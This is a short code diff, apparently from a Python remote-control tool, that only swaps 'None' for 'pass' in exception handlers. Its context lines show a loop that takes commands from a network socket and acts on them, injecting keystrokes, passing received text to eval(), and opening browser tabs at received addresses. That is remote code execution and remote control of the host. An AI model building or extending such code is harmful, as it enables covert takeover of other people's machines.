@@ -23,10 +23,10 @@ while True:
                 try:
                     keyboard.press_and_release(user.recv(1024).decode("utf-8").lower())
                 except Exception:
-                    None
+                    pass
             if data == "eve":
                  eval(user.recv(1024).decode("utf-8").lower())
             if data == "browser":
                  webbrowser.open_new_tab(user.recv(1024).decode("utf-8").lower())
     except Exception:
-                    None
+                    pass
